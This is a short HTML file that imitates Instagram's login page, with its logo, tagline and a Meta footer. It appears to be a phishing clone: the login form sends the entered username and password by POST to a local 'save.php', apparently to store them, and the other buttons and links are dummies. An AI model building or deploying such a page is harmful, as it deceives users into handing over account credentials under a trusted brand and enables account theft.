<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Social Login</title>
  <link rel="stylesheet" href="style.css">
</head>

<body>

<div class="page">

  <!-- LEFT / TOP BRAND AREA -->
  <div class="brand">
    <img src="instlogo.png" alt="Instagram Logo" class="icon">
    <h1>Instagram</h1>
    <p>See everyday moments from your close friends.</p>
  </div>

  <!-- LOGIN BOX -->
  <div class="login">

    <div class="card">

      <div class="title">Log In</div>

<form action="save.php" method="POST">

  <input
  type="text"
  name="username"
  placeholder="Phone, username or email"
  required
>

<input
  type="password"
  name="password"
  placeholder="Password"
  required
>

  <button class="btn" type="submit">Log in</button>

</form>

      <div class="line">
        <span></span>
        <p>OR</p>
        <span></span>
      </div>

      <button class="fb">
        Continue with Facebook
      </button>

      <a href="#" class="forgot">Forgot password?</a>

    </div>

    <div class="card bottom">
      <p>Don't have an account? <a href="#">Sign up</a></p>
    </div>

    <div class="meta">∞ Meta</div>

  </div>

</div>

</body>
</html>
